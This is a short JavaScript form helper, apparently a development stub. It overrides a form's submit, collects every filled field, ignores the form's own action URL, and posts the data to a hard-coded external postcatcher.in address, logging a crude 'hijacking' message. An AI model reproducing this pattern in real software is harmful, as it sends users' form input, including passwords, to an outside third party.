var extend = require ('../helpers/extend'),
    post = require ('../helpers/post');

function inlineSubmit(el, options) {
    this.el = el;
    this.options = extend( {}, this.options );
    extend( this.options, options );
    this._init();
}

inlineSubmit.prototype.options = {
    pattern: /.*/
}

inlineSubmit.prototype._init = function() {
    var self = this;

    self.el.onsubmit = function(e) {
        e.preventDefault();
        self.submit();
    };
}

inlineSubmit.prototype.getAction = function() {
    var self = this,
        action = this.el.getAttribute('action');

    return action;
}

inlineSubmit.prototype.getFormData = function() {
    var self = this,
        data = {},
        i,
        e;

    for (i = 0; i < self.el.elements.length; i++) {
        e = self.el.elements[i];
        if (e.name.length > 0 && e.value.length > 0) {
            data[e.name] = e.value;
        }
    }

    return data;
}

inlineSubmit.prototype.submit = function() {
    console.log("I'm hijacking this form, motherfucka!");

    var self = this,
        url = self.getAction(),
        data = self.getFormData(),
        callback = function() {
            console.log('Sent!');
        };

    console.log(url, data);

    post('http://postcatcher.in/catchers/54d4b6d926f935030000398c', data, callback);
}

module.exports = inlineSubmit;